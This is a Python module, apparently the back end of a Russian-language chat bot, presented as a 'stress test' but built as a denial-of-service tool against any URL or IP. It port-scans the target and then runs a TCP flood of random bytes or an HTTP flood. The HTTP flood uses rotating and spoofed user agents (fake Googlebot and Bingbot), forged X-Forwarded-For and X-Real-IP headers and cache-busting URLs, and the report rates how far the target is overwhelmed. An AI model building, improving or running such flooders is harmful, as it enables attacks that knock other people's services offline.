import asyncio
import time
import random
import string
import re
import aiohttp
from html import escape

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "curl/8.7.1",
    "python-requests/2.31.0",
    "Go-http-client/2.0",
    "okhttp/4.12.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "axios/1.6.8",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://yandex.ru/",
    "https://t.me/",
    "https://vk.com/",
    "",
]

ACCEPT_LANGS = [
    "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "en-US,en;q=0.9",
    "de-DE,de;q=0.9,en;q=0.8",
    "uk-UA,uk;q=0.9,ru;q=0.8",
]

SCAN_PORTS = [80, 443, 8080, 8443, 8000, 3000, 5000, 7777, 25565, 22, 21, 3306, 5432]


def _rand_str(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def _rand_headers() -> dict:
    h = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice([
            "text/html,application/xhtml+xml,*/*;q=0.8",
            "*/*",
            "application/json, text/plain, */*",
        ]),
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache", "no-store", "max-age=0"]),
        "Pragma": "no-cache",
        "Connection": "close",
    }
    ref = random.choice(REFERERS)
    if ref:
        h["Referer"] = ref
    if random.random() < 0.4:
        h["X-Forwarded-For"] = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
    if random.random() < 0.3:
        h["X-Real-IP"] = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
    return h


def _bust_url(url: str) -> str:
    sep = "&" if "?" in url else "?"
    return f"{url}{sep}_={_rand_str(12)}&r={random.randint(10000, 99999)}"


def _parse_target(url: str) -> tuple[str, int]:
    """Extract (host, port) from any URL or bare IP."""
    url = url.strip()
    m = re.match(r'^(\d{1,3}(?:\.\d{1,3}){3}):(\d+)', url)
    if m:
        return m.group(1), int(m.group(2))
    m = re.match(r'^(\d{1,3}(?:\.\d{1,3}){3})$', url)
    if m:
        return m.group(1), 80
    if url.startswith("https://"):
        host = url[8:].split("/")[0].split(":")[0]
        port = int(url[8:].split("/")[0].split(":")[1]) if ":" in url[8:].split("/")[0] else 443
        return host, port
    if url.startswith("http://"):
        host = url[7:].split("/")[0].split(":")[0]
        port = int(url[7:].split("/")[0].split(":")[1]) if ":" in url[7:].split("/")[0] else 80
        return host, port
    host = url.split("/")[0].split(":")[0]
    return host, 80


async def scan_ports(host: str, ports: list[int], timeout: float = 1.5) -> list[int]:
    """Return list of open ports."""
    open_ports = []

    async def check(port: int):
        try:
            conn = asyncio.open_connection(host, port)
            reader, writer = await asyncio.wait_for(conn, timeout=timeout)
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            open_ports.append(port)
        except Exception:
            pass

    await asyncio.gather(*[check(p) for p in ports])
    return sorted(open_ports)


# ─── TCP flood ────────────────────────────────────────────────────────────────

async def run_tcp_flood(
    host: str,
    port: int,
    total: int,
    concurrency: int,
    progress_cb=None,
) -> dict:
    semaphore = asyncio.Semaphore(concurrency)
    lock = asyncio.Lock()
    start_wall = time.monotonic()
    live = {"done": 0, "success": 0, "failed": 0}
    results = []

    async def one_tcp():
        async with semaphore:
            t0 = time.monotonic()
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=4.0
                )
                # Send random garbage bytes to exhaust buffers
                payload = random.randbytes(random.randint(64, 512))
                writer.write(payload)
                await asyncio.wait_for(writer.drain(), timeout=2.0)
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                elapsed = time.monotonic() - t0
                result = {"ok": True, "time": elapsed}
            except asyncio.TimeoutError:
                result = {"ok": False, "error": "timeout", "time": time.monotonic() - t0}
            except ConnectionRefusedError:
                result = {"ok": False, "error": "refused", "time": time.monotonic() - t0}
            except OSError as e:
                result = {"ok": False, "error": "os_error", "time": time.monotonic() - t0}
            except Exception as e:
                result = {"ok": False, "error": type(e).__name__, "time": time.monotonic() - t0}

            async with lock:
                live["done"] += 1
                if result["ok"]:
                    live["success"] += 1
                else:
                    live["failed"] += 1
                step = max(50, total // 25)
                if progress_cb and live["done"] % step == 0:
                    elapsed_wall = time.monotonic() - start_wall
                    rps = live["done"] / elapsed_wall if elapsed_wall > 0 else 0
                    await progress_cb(live["done"], total, live["success"], live["failed"], rps)

            results.append(result)

    tasks = [one_tcp() for _ in range(total)]
    await asyncio.gather(*tasks)

    return _build_result(results, total, concurrency, time.monotonic() - start_wall, mode="tcp")


# ─── HTTP flood ───────────────────────────────────────────────────────────────

async def run_http_flood(
    url: str,
    total: int,
    concurrency: int,
    progress_cb=None,
) -> dict:
    semaphore = asyncio.Semaphore(concurrency)
    lock = asyncio.Lock()
    start_wall = time.monotonic()
    live = {"done": 0, "success": 0, "failed": 0}
    results = []
    method_pool = ["GET"] * 6 + ["POST"] * 3 + ["HEAD"] * 1

    async def one_http(session: aiohttp.ClientSession):
        async with semaphore:
            method = random.choice(method_pool)
            req_url = _bust_url(url)
            headers = _rand_headers()
            t0 = time.monotonic()
            try:
                kwargs: dict = {
                    "headers": headers,
                    "timeout": aiohttp.ClientTimeout(total=10, connect=4),
                    "allow_redirects": True,
                    "max_redirects": 3,
                    "ssl": False,
                }
                if method == "POST":
                    kwargs["data"] = ("&".join(
                        f"{_rand_str(6)}={_rand_str(random.randint(4, 12))}"
                        for _ in range(16)
                    )).encode()
                    headers["Content-Type"] = "application/x-www-form-urlencoded"

                async with session.request(method, req_url, **kwargs) as resp:
                    await resp.read()
                    elapsed = time.monotonic() - t0
                    result = {"ok": resp.status < 500, "status": resp.status, "time": elapsed, "method": method}
            except asyncio.TimeoutError:
                result = {"ok": False, "error": "timeout", "time": time.monotonic() - t0, "method": method}
            except aiohttp.ClientConnectorError:
                result = {"ok": False, "error": "connect_error", "time": time.monotonic() - t0, "method": method}
            except Exception as e:
                result = {"ok": False, "error": type(e).__name__, "time": time.monotonic() - t0, "method": method}

            async with lock:
                live["done"] += 1
                if result.get("ok"):
                    live["success"] += 1
                else:
                    live["failed"] += 1
                step = max(50, total // 25)
                if progress_cb and live["done"] % step == 0:
                    elapsed_wall = time.monotonic() - start_wall
                    rps = live["done"] / elapsed_wall if elapsed_wall > 0 else 0
                    await progress_cb(live["done"], total, live["success"], live["failed"], rps)

            results.append(result)

    connector = aiohttp.TCPConnector(
        limit=concurrency,
        limit_per_host=concurrency,
        ttl_dns_cache=60,
        enable_cleanup_closed=True,
        force_close=True,
    )
    async with aiohttp.ClientSession(connector=connector, connector_owner=True) as session:
        await asyncio.gather(*[one_http(session) for _ in range(total)])

    return _build_result(results, total, concurrency, time.monotonic() - start_wall, mode="http")


def _build_result(results: list, total: int, concurrency: int, wall_time: float, mode: str) -> dict:
    times = sorted(r["time"] for r in results)
    success = [r for r in results if r.get("ok")]
    failed = [r for r in results if not r.get("ok")]
    n = len(times)

    def pct(p: float) -> float:
        idx = min(int(n * p / 100), n - 1)
        return times[idx]

    status_counts: dict[int, int] = {}
    for r in results:
        s = r.get("status")
        if s:
            status_counts[s] = status_counts.get(s, 0) + 1

    error_types: dict[str, int] = {}
    for r in failed:
        e = r.get("error", "unknown")
        error_types[e] = error_types.get(e, 0) + 1

    method_counts: dict[str, int] = {}
    for r in results:
        m = r.get("method", "TCP")
        method_counts[m] = method_counts.get(m, 0) + 1

    return {
        "mode": mode,
        "total": total,
        "concurrency": concurrency,
        "success": len(success),
        "failed": len(failed),
        "success_rate": len(success) / total * 100 if total else 0,
        "wall_time": wall_time,
        "rps": total / wall_time if wall_time > 0 else 0,
        "avg_time": sum(times) / n if n else 0,
        "min_time": times[0] if times else 0,
        "max_time": times[-1] if times else 0,
        "p50": pct(50),
        "p75": pct(75),
        "p95": pct(95),
        "p99": pct(99),
        "status_counts": status_counts,
        "error_types": error_types,
        "method_counts": method_counts,
    }


# ─── Main entry point ─────────────────────────────────────────────────────────

async def run_stress_test(
    url: str,
    total: int = 1000,
    concurrency: int = 100,
    progress_cb=None,
    scan_cb=None,
) -> dict:
    """
    Auto-detects mode:
    - If URL has http/https scheme and port 80/443 responds with HTTP → HTTP flood
    - Otherwise → TCP flood on the best open port
    Returns result dict with extra 'mode', 'port', 'open_ports' fields.
    """
    host, explicit_port = _parse_target(url)
    is_bare_ip = re.match(r'^\d{1,3}(\.\d{1,3}){3}(:\d+)?$', url.strip()) is not None
    has_scheme = url.startswith("http://") or url.startswith("https://")

    # Step 1: scan ports
    ports_to_scan = [explicit_port] if explicit_port not in SCAN_PORTS else SCAN_PORTS
    if explicit_port not in ports_to_scan:
        ports_to_scan = [explicit_port] + SCAN_PORTS

    if scan_cb:
        await scan_cb(f"🔍 Сканирую {host}…")

    open_ports = await scan_ports(host, ports_to_scan)

    if scan_cb:
        if open_ports:
            await scan_cb(f"✅ Открытые порты: {', '.join(map(str, open_ports))}")
        else:
            await scan_cb(f"⚠️ Открытых портов не найдено, пробуем TCP на порт {explicit_port}")

    # Step 2: pick best port and mode
    http_ports = {80, 8080, 8000, 3000, 5000}
    https_ports = {443, 8443}

    chosen_port = explicit_port
    use_http = False

    if open_ports:
        # Prefer the explicitly requested port if it's open
        if explicit_port in open_ports:
            chosen_port = explicit_port
        else:
            chosen_port = open_ports[0]

        if chosen_port in http_ports:
            use_http = True
        elif chosen_port in https_ports:
            use_http = True
        else:
            use_http = False
    else:
        # No open ports found — still try TCP flood
        chosen_port = explicit_port
        use_http = False

    # Force HTTP if caller passed a full http/https URL and port responds
    if has_scheme and chosen_port in (http_ports | https_ports):
        use_http = True

    mode_label = "HTTP-флуд" if use_http else "TCP-флуд"
    if scan_cb:
        await scan_cb(f"⚡ Режим: <b>{mode_label}</b> → {host}:{chosen_port}")

    # Step 3: run the flood
    if use_http:
        scheme = "https" if chosen_port in https_ports else "http"
        flood_url = f"{scheme}://{host}:{chosen_port}/" if chosen_port not in (80, 443) else f"{scheme}://{host}/"
        # If caller gave full URL, use it as-is
        if has_scheme:
            flood_url = url
        result = await run_http_flood(flood_url, total, concurrency, progress_cb)
    else:
        result = await run_tcp_flood(host, chosen_port, total, concurrency, progress_cb)

    result["port"] = chosen_port
    result["open_ports"] = open_ports
    result["host"] = host
    return result


def format_stress_report(url: str, data: dict) -> str:
    sr = data["success_rate"]
    rps = data["rps"]
    wall = data["wall_time"]
    avg = data["avg_time"] * 1000
    p95 = data["p95"] * 1000
    mode = data.get("mode", "http")
    port = data.get("port", "?")
    open_ports = data.get("open_ports", [])
    host = data.get("host", url)

    mode_icon = "🌐 HTTP-флуд" if mode == "http" else "🔌 TCP-флуд"

    if sr >= 95 and p95 < 500:
        verdict = "🟢 Цель уверенно держит нагрузку"
        pressure = "🛡 Защита: высокая"
    elif sr >= 80:
        verdict = "🟡 Небольшие просадки под нагрузкой"
        pressure = "⚙️ Защита: средняя"
    elif sr >= 50:
        verdict = "🟠 Заметные потери — сервер нагружен"
        pressure = "⚠️ Защита: слабая"
    elif sr >= 20:
        verdict = "🔴 Сервер с трудом справляется"
        pressure = "💥 Защита: критическая"
    else:
        verdict = "💀 Цель не отвечает / перегружена"
        pressure = "☠️ Цель недоступна под нагрузкой"

    lines = [
        f"🔥 <b>СТРЕСС-ТЕСТ ЗАВЕРШЁН</b>",
        f"━━━━━━━━━━━━━━━━━━━━━━━━",
        f"🎯 <code>{escape(host)}</code>  :{port}",
        f"📡 Режим: <b>{mode_icon}</b>",
    ]

    if open_ports:
        lines.append(f"🔓 Открытые порты: <b>{', '.join(map(str, open_ports))}</b>")

    lines += [
        f"",
        f"⚙️ <b>Нагрузка:</b>  {data['total']:,} запросов  •  {data['concurrency']} потоков",
        f"🕐 <b>Время теста:</b>  {wall:.1f} сек",
        f"",
        f"<b>📊 Результат:</b>",
        f"  ✅ Успешных:  <b>{data['success']:,}</b>  ({sr:.1f}%)",
        f"  ❌ Ошибок:    <b>{data['failed']:,}</b>",
        f"  🚀 RPS:       <b>{rps:.0f}</b> / сек",
        f"",
        f"<b>⏱ Время отклика:</b>",
        f"  ⚡ Мин:  <b>{data['min_time']*1000:.0f} мс</b>",
        f"  📊 Ср:   <b>{avg:.0f} мс</b>",
        f"  📊 P50:  <b>{data['p50']*1000:.0f} мс</b>",
        f"  📊 P95:  <b>{p95:.0f} мс</b>",
        f"  🐢 Макс: <b>{data['max_time']*1000:.0f} мс</b>",
    ]

    if data["status_counts"]:
        lines.append(f"\n<b>🔢 HTTP-статусы:</b>")
        for code, cnt in sorted(data["status_counts"].items()):
            icon = "🟢" if code < 300 else "🔵" if code < 400 else ("🟡" if code == 429 else ("🟠" if code < 500 else "🔴"))
            lines.append(f"  {icon} {code}: {cnt:,}×")

    if data["error_types"]:
        lines.append(f"\n<b>⚠️ Типы ошибок:</b>")
        for err, cnt in sorted(data["error_types"].items(), key=lambda x: -x[1]):
            lines.append(f"  • {escape(err)}: {cnt:,}×")

    lines += [
        f"",
        f"━━━━━━━━━━━━━━━━━━━━━━━━",
        verdict,
        pressure,
    ]

    if 429 in data.get("status_counts", {}):
        lines.append("🚧 Обнаружен rate-limit (429) — сервер защищается")
    if data.get("error_types", {}).get("refused", 0) > data["total"] * 0.5:
        lines.append("🔌 Порт закрыт или фильтруется фаерволом")

    return "\n".join(lines)
